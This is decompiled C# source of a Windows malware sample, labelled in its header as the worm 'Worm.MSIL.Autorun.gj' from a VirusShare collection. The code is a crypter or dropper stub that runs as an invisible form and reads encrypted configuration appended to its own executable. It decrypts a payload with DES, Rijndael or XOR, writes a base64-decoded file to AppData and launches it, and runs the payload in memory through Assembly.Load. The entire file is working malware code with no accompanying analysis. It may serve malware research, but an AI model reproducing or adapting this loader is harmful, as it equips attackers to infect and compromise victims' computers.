// Decompiled with JetBrains decompiler
// Type: A.c5af1b400108cd0b3a9a03bced384fdc5
// Assembly: Themes, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F1CED465-DC2F-40DF-8008-E1A5BA91B6DC
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Worm.MSIL.Autorun.gj-eafdf0c256b415039327b1617f1f280eb22975e5d3328254127f60f9f6fa09f7.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace A
{
  [DesignerGenerated]
  public class c5af1b400108cd0b3a9a03bced384fdc5 : Form
  {
    private static List<WeakReference> c3a8c7e09cb35257b5b9110ccde6079ac = new List<WeakReference>();
    private IContainer cd8cf81872281cf0d23fda2dc441c78e1;
    private const string ccb0eef97e7fa509e4a4947e7d7dfbe37 = "PExGmUwIcWzCpQsd3t2q1o6I6gELmtwnOAy5KwOXCG4bdcLNDeDtJBufhU1NdFAaqATQc8";
    private string ca4ab76edaa769b243ff4f4e440a8e956;
    private string c34d354aa1d9ddb1d8a5978c97672412d;
    private bool c65fec5e13832155f9eb7d46d143ba772;

    [DebuggerNonUserCode]
    static c5af1b400108cd0b3a9a03bced384fdc5()
    {
    }

    public c5af1b400108cd0b3a9a03bced384fdc5()
    {
      this.Load += new EventHandler(this.c7a1e0385559257043f269766d635fb3e);
      lock (c5af1b400108cd0b3a9a03bced384fdc5.c3a8c7e09cb35257b5b9110ccde6079ac)
        c5af1b400108cd0b3a9a03bced384fdc5.c3a8c7e09cb35257b5b9110ccde6079ac.Add(new WeakReference((object) this));
      this.c34d354aa1d9ddb1d8a5978c97672412d = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
      this.c65fec5e13832155f9eb7d46d143ba772 = false;
      this.cc48c8b2a9bf80afeb7ebf30ba32b28ca();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.cd8cf81872281cf0d23fda2dc441c78e1 == null)
          return;
        this.cd8cf81872281cf0d23fda2dc441c78e1.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void cc48c8b2a9bf80afeb7ebf30ba32b28ca()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(10, 10);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = "Form1";
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.Text = "Form1";
      this.ResumeLayout(false);
    }

    private void c7a1e0385559257043f269766d635fb3e(
      object c01c353697bf52f4946751d37b5c613d3,
      EventArgs c05751861ed21989fb989c43717620204)
    {
      string[] strArray = Strings.Split(Encoding.Default.GetString(c79a50d5f4c6ada2167dbacf531ca654f.ce878901b70996a18b129fd185238d960(Application.ExecutablePath)), "PExGmUwIcWzCpQsd3t2q1o6I6gELmtwnOAy5KwOXCG4bdcLNDeDtJBufhU1NdFAaqATQc8");
      string Left1 = strArray[1];
      string str1 = strArray[2];
      string str2 = strArray[4];
      string str3 = strArray[5];
      string Left2 = strArray[6];
      string Left3 = strArray[10];
      string fileName = strArray[11];
      string Left4 = strArray[12];
      string Left5 = strArray[13];
      string text = strArray[14];
      string caption = strArray[15];
      string Left6 = strArray[16];
      string Left7 = strArray[17];
      string str4 = strArray[18];
      string str5 = strArray[19];
      string Left8 = strArray[20];
      try
      {
        if (Operators.CompareString(Left5, "Activated", false) == 0)
        {
          int num = (int) MessageBox.Show(text, caption, MessageBoxButtons.OK);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      if (Operators.CompareString(fileName, "own", false) == 0)
        fileName = Process.GetCurrentProcess().MainModule.FileName;
      if (Operators.CompareString(Left1, "true", false) == 0)
        c932a1f46175f5cf10cc37a85a6e7125d.c610d70fa06caec4ea1fd0dcb9fa1922d();
      if (Operators.CompareString(Left2, "true", false) == 0)
        c932a1f46175f5cf10cc37a85a6e7125d.cb277ba5015674c97518f587edbc92f62();
      if (Operators.CompareString(Left6, "true", false) == 0)
        c932a1f46175f5cf10cc37a85a6e7125d.cc5ca76e62b2657a9c5de87bca8c6252a();
      if (Operators.CompareString(Left7, "true", false) == 0)
        c932a1f46175f5cf10cc37a85a6e7125d.c2df6a58a7a03f5c82ec6bbbb0de301e3();
      if (Operators.CompareString(Left3, "true", false) == 0)
      {
        c932a1f46175f5cf10cc37a85a6e7125d.c2b4ae42c382bedf73a5b12a116110530();
        c932a1f46175f5cf10cc37a85a6e7125d.c81a770e19eeef3c8220cf12174eacb00();
        c932a1f46175f5cf10cc37a85a6e7125d.c830b6a83557b605c38daa1c177c07323();
        c932a1f46175f5cf10cc37a85a6e7125d.c47923cb2d7999053fdd17c676cc912a8();
        c932a1f46175f5cf10cc37a85a6e7125d.cf63283c1ff1a704e9676e0b4e7d245a7();
      }
      if (Operators.CompareString(Left4, "true", false) == 0)
        c932a1f46175f5cf10cc37a85a6e7125d.c3bb934f714a149fb300ebf1174d491cc();
      this.ca4ab76edaa769b243ff4f4e440a8e956 = Operators.CompareString(Left8, "des", false) != 0 ? c4b6f6be8c453ab01d199807056388c5e.ccb7e66ddaa2f8ad76005f441a3eb7052(strArray[3], str1) : c4b6f6be8c453ab01d199807056388c5e.cb70c1d106d22f042e689082f38a09fd2(strArray[3], str1, true);
      if (Operators.CompareString(Left8, "Rijndael", false) == 0)
        this.ca4ab76edaa769b243ff4f4e440a8e956 = Conversions.ToString(c4b6f6be8c453ab01d199807056388c5e.c654e40b28da2395755ca28ae0ddb39d5(strArray[3], str1));
      if (Operators.CompareString(Left8, "XOR", false) == 0)
        this.ca4ab76edaa769b243ff4f4e440a8e956 = c4b6f6be8c453ab01d199807056388c5e.c33621ed5e8cf8007cc0b33f6c1cee8b3(strArray[3], str1);
      bool flag = c2a260695232d4f43826883ef8fb858ca.c73c045d653ba31b5acc38eb392fa140e();
      if (Operators.CompareString(strArray[7], "NULL", false) != 0)
      {
        try
        {
          byte[] bytes = this.c3f3bd3b44db2da07da35e3df81720e0c(strArray[7]);
          File.WriteAllBytes(this.c34d354aa1d9ddb1d8a5978c97672412d + strArray[8], bytes);
          Process.Start(this.c34d354aa1d9ddb1d8a5978c97672412d + strArray[8]);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (flag)
      {
        try
        {
          if (this.c3743bfbe1d4c035549d0e86a928c37fd())
          {
            Thread thread = new Thread((ParameterizedThreadStart) (c2f1c5f26a009e6593793b59a25ea69df => this.ca2800a5744d423d2f058994383ffb968(Conversions.ToString(c2f1c5f26a009e6593793b59a25ea69df))));
            thread.TrySetApartmentState(ApartmentState.STA);
            thread.Start((object) c4b6f6be8c453ab01d199807056388c5e.cb70c1d106d22f042e689082f38a09fd2(strArray[3], str1, true));
            this.Close();
          }
          else
          {
            c6dd6e723b89a7627d43e5e0a295e728c c6dd6e723b89a7627d43e5e0a295e728c = new c6dd6e723b89a7627d43e5e0a295e728c();
            c6dd6e723b89a7627d43e5e0a295e728c.c6d62a1793d529be8f6d6100854e2c028(Encoding.Default.GetBytes(this.ca4ab76edaa769b243ff4f4e440a8e956), fileName);
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          Process.GetCurrentProcess().Kill();
          ProjectData.EndApp();
          ProjectData.ClearProjectError();
        }
      }
      if (flag)
        return;
      try
      {
        if (this.c3743bfbe1d4c035549d0e86a928c37fd())
        {
          Thread thread = new Thread((ParameterizedThreadStart) (c2f1c5f26a009e6593793b59a25ea69df => this.ca2800a5744d423d2f058994383ffb968(Conversions.ToString(c2f1c5f26a009e6593793b59a25ea69df))));
          thread.TrySetApartmentState(ApartmentState.STA);
          thread.Start((object) c4b6f6be8c453ab01d199807056388c5e.cb70c1d106d22f042e689082f38a09fd2(strArray[3], str1, true));
          this.Close();
        }
        else
        {
          c6dd6e723b89a7627d43e5e0a295e728c c6dd6e723b89a7627d43e5e0a295e728c = new c6dd6e723b89a7627d43e5e0a295e728c();
          c6dd6e723b89a7627d43e5e0a295e728c.c6d62a1793d529be8f6d6100854e2c028(Encoding.Default.GetBytes(this.ca4ab76edaa769b243ff4f4e440a8e956), fileName);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Process.GetCurrentProcess().Kill();
        ProjectData.EndApp();
        ProjectData.ClearProjectError();
      }
    }

    private void cb4e4c67f2fa603be03ad91927705fe8c(byte[] c45c4923e651b2a84501a183177fef531)
    {
      Assembly assembly = Assembly.Load(c45c4923e651b2a84501a183177fef531);
      MethodInfo entryPoint = assembly.EntryPoint;
      object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(assembly.CreateInstance(entryPoint.Name))));
      entryPoint.Invoke(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objectValue))), new object[1]
      {
        (object) new string[1]{ "1" }
      });
    }

    private bool c3743bfbe1d4c035549d0e86a928c37fd()
    {
      bool flag;
      if (this.ca4ab76edaa769b243ff4f4e440a8e956.Contains("</assembly>"))
      {
        if (Operators.CompareString(Strings.Split(this.ca4ab76edaa769b243ff4f4e440a8e956, "</assembly>")[1].ToLower(), "", false) != 0)
          flag = true;
      }
      else
        flag = false;
      return flag;
    }

    public void ca2800a5744d423d2f058994383ffb968(string c5570f4e1ae5e49ad4c31e778f8f1e32e)
    {
      byte[] bytes = Encoding.GetEncoding(1252).GetBytes(c5570f4e1ae5e49ad4c31e778f8f1e32e);
      Thread thread = new Thread((ParameterizedThreadStart) (c2f1c5f26a009e6593793b59a25ea69df => this.cb4e4c67f2fa603be03ad91927705fe8c((byte[]) c2f1c5f26a009e6593793b59a25ea69df)));
      thread.TrySetApartmentState(ApartmentState.STA);
      thread.Start((object) bytes);
      this.Close();
    }

    public byte[] c3f3bd3b44db2da07da35e3df81720e0c(string cbb22029d55a64ede3fdbb1320b3dd3d9) => cbb22029d55a64ede3fdbb1320b3dd3d9 != null ? Convert.FromBase64String(cbb22029d55a64ede3fdbb1320b3dd3d9) : throw new ArgumentNullException("base64");
  }
}
